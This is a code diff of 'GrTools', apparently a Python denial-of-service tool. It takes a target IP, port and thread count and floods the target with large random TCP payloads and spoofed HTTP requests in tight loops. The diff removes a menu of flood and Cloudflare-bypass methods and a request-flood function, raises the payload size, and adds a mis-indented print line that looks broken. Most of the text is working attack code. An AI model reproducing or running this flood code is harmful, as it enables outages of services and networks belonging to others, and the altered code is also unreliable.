@@ -173,28 +173,10 @@ ip = str(input("\033[36m╔══\n╚══════>Server@GrTools~ Enter T
 port = int(input("\033[36m ╔══\n╚══════>Server@GrTools~ Input Port : "))
 t = int(input("\033[36m ╔══\n╚══════>Server@GrTools~ Input Times : "))
 th = int(input("\033[36m ╔══\n╚══════>Server@GrTools~ Input Thread : "))
-
-os.system('cls')
-print("""
-\033[36m                    ┌───────────────────────────────────────────────────────────────────────────────────────┐
-\033[36m                    │                                       GrTools Methods                                 │
-\033[36m                    │───────────────────────────────────────────────────────────────────────────────────────│
-\033[36m                    │  [+] TCP      |  LAYER4  | BASED ON FLOOD ATTACK ON TCP PORT  | INCREASED POWER 1.5X  │
-\033[36m                    │  [+] UDP      |  LAYER4  | BASED ON FLOOD ATTACK ON UDP PORT  | NON                   │
-\033[36m                    │  [+] CPUKILL  |  LAYER4  | BASED ON CPU   ATTACK ON ALL PORT  | POWER IS DOWN         │
-\033[36m                    │  [+] REQ      |  LAYER4  | BASED ON REQUEST SPAM ON TCP PORT  | INCREASED POWER 2X    │
-\033[36m                    │  [+] DOWN     |  LAYER4  | BASED ON DDoS  ATTACK ON TCP PORT  | NEW METHOD            │
-\033[36m                    │  [+] ALL      |  LAYER4  | BASED ON FLOOD ATTACK ON ALL PORT  | NON                   │ 
-\033[36m                    │  [+] CFSOC    |  LAYER7  | BYPASS CF UAM, CAPTCHA             | NEW METHOD            │
-\033[36m                    │  [+] CFREQ    |  LAYER7  | BYPASS CF , REQUEST SPAM           | NEW METHOD            │ 
-\033[36m                    │  [+] SUBNET   |  TOOLS   | FINDING A SUB IP                   | API MAYBE LIMIT       │  
-\033[36m                    └───────────────────────────────────────────────────────────────────────────────────────┘
-""")
-
 method = str(input("╔══\n╚══════>Server@GrTools~~ Enter Methods : "))
 
 if method == "UDP" or method == "CPUKILL" or method == "TCP" or method == "ALL" or method == "REQ" or method == "CFREQ" or method == "SUBNET" or method == "CFSOC":
-  
+
     def tcpfl():
         get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
         post_host = "POST /Attacked-by-GrTools HTTP/1.1\r\nHost: " + ip + "\r\n"
@@ -211,7 +193,7 @@ if method == "UDP" or method == "CPUKILL" or method == "TCP" or method == "ALL" 
         httpss = "User-Agent: " + random.choice(https) + "\r\n"
         connection += "X-Forwarded-For: " + spoofer() + "\r\n"
         request = get_host + post_host + get_data + httpss + mozila + referer + content + socks + forward + forwards + accept + connection + connection + "\r\n"
-        grtools = random._urandom(20404)
+        grtools = random._urandom(150404)
         while True:
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -227,79 +209,11 @@ if method == "UDP" or method == "CPUKILL" or method == "TCP" or method == "ALL" 
                     sock.send(grtools)
                     sock.send(grtools)
                     sock.send(grtools)
-                print(f"Sending Packet to > ip : \033[32m{ip} \033[37mport : \033[32m{port} | \033[37mwith time => \033[32m{t} \033[37mwith Method {method} ")
-            except socket.error:
-                print(f"Sending Packet to > ip : \033[32m{ip} \033[37mport : \033[32m{port} | \033[37mwith time => \033[32m{t} \033[37mwith Method {method}")
                 sock.close()
-                    
-    def req():
-        get_host = "GET/growtopia/server_data.php HTTP/1.1\r\nHost: " + ip + "\r\n"
-        post_host = "POST /Attacked-by-GrTools HTTP/1.1\r\nHost: " + ip + "\r\n"
-        get_data = "GET https://check-host.net//1.1\r\nHost: " + ip + "\r\n"
-        referer = "Referer: " + random.choice(https) + ip + "\r\n"
-        connection = "Connection: Keep-Alive\r\n" + "\r\n"
-        content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
-        socks = "socks5: " + random.choice(socks5) + "\r\n"
-        length = "Content-Length: 0\r\n"
-        forward = "X-Forwarded-For: 1\r\n"
-        forwards = "Client-IP: " + ip + "\r\n"
-        accept = random.choice(useragents) + "\r\n"
-        mozila = "User-Agent: " + random.choice(useragents) + "\r\n"
-        httpss = "User-Agent: " + random.choice(https) + "\r\n"
-        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
-        request = get_host + post_host + get_data + httpss + mozila + referer + content + socks + forward + forwards + accept + connection + connection + "\r\n"
-        grtools = os.urandom(205018)
-        while True:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-                s.connect((ip, port))
-                s.send(grtools)
-                s.send(grtools)
-                s.send(grtools)
-                s.sendall(str.encode(request))
-                s.sendall(str.encode(request))
-                s.sendall(str.encode(request))
-                s.sendall(str.encode(request))
-                s.sendall(str.encode(request))
-                s.sendall(str.encode(request))
-                s.sendall(str.encode(request))
-                s.sendall(str.encode(request))
-                s.sendall(str.encode(request))
-                s.sendall(str.encode(request))
-                s.sendall(str.encode(request))
-                s.sendall(str.encode(request))
-                s.sendall(str.encode(request))
-                s.sendall(str.encode(request))
-                s.sendall(str.encode(request))
-                for x in range(7500000):
-                    s.send(grtools)
-                    s.send(grtools)
-                    s.send(grtools)
-                    s.sendall(str.encode(request))
-                    s.sendall(str.encode(request))
-                    s.sendall(str.encode(request))
-                    s.sendall(str.encode(request))
-                    s.sendall(str.encode(request))
-                    s.sendall(str.encode(request))
-                    s.sendall(str.encode(request))
-                    s.sendall(str.encode(request))
-                    s.sendall(str.encode(request))
-                    s.sendall(str.encode(request))
-                    s.sendall(str.encode(request))
-                    s.sendall(str.encode(request))
-                    s.sendall(str.encode(request))
-                    s.sendall(str.encode(request))
-                    s.sendall(str.encode(request))
-                print(f"Sending Packet to > ip : \033[32m{ip} \033[37mport : \033[32m{port} | \033[37mwith time => \033[32m{t} \033[37mwith Method {method} ")
-            except socket.error:
-                print(f"Sending Packet to > ip : \033[32m{ip} \033[37mport : \033[32m{port} | \033[37mwith time => \033[32m{t} \033[37mwith Method {method} ")
-                s.close()
-        
+
 for x in range(50000):
     if method == "TCP":
         t = threading.Thread(target=tcpfl)
+	print("[GrBroadcast] Succesfully sended ")
         t.start()
-        t2 = threading.Thread(target=req)
-        t2.start()
   
